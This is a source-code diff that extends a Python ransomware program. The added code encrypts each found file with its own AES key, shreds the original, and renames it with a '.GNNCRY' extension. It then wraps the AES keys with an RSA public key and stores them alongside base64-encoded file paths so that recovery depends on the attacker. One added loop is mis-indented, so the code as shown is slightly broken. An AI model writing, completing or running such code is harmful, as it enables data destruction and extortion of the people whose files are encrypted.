@@ -10,6 +10,8 @@ import generate_keys
 from Crypto.PublicKey import RSA
 import gc
 from Crypto.Hash import MD5
+import base64
+
 
 # const variables
 server_public_key = ("""-----BEGIN PUBLIC KEY-----
@@ -48,10 +50,11 @@ def shred(file_name,  passes=1):
 
 
 def start_encryption(files):
-    keys = []
+    AES_keys = []
+    AES_and_base64_path = []
     for found_file in files:
         key = generate_keys.generate_key(32, True)
-        keys.append(key)
+        AES_keys.append(key)
         AES_obj = symmetric.AESCipher(key)
 
         with open(found_file, 'rb') as f:
@@ -60,10 +63,16 @@ def start_encryption(files):
         encrypted = AES_obj.encrypt(file_content)
         shred(found_file)
 
-        with open(found_file + ".GNNCRY", 'wb') as f:
+        new_file_name = found_file + ".GNNCRY"
+        with open(new_file_name, 'wb') as f:
             f.write(encrypted)
-        
 
+        base64_new_file_name = base64.b64encode(new_file_name)
+
+        # list of tuples of AES_key and base64(path)
+        AES_and_base64_path.append((key, base64_new_file_name))
+    
+    return AES_and_base64_path
 
 
 
@@ -114,10 +123,30 @@ def menu():
         Client_public_key = f.read()
     client_public_key_object =  RSA.importKey(Client_public_key)
     
-    # use it to encrypt AES keys
-    # client_public_key_object.encrypt()
 
+    # ENCRYPTION STARTS HERE !!!
+    aes_keys_and_base64_path = start_encryption(files)
+    enc_aes_key_and_base64_path = []
 
+    for _ in aes_keys_and_base64_path:
+        aes_key = _[0]
+        base64_path = _[1]
+
+        # encrypt with the client public key
+        encrypted_aes_key = client_public_key_object.encrypt(aes_key, 'x')[0]
+        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
+    
+    # free the old AES keys
+    aes_keys_and_base64_path = None
+    gc.collect()
+
+    # save to disk -> ENC(AES) BASE64(PATH)
+    with open(ransomware_path + "aes_keys_and_paths", 'w') as f:
+    for _ in enc_aes_key_and_base64_path:
+        line = _[0] + " " + _[1] + "\n"
+        f.write(line)
+
+    gc.collect()
     # TODO
     # encrypt all the AES keys with Client public key 
     # create file with description of what happened
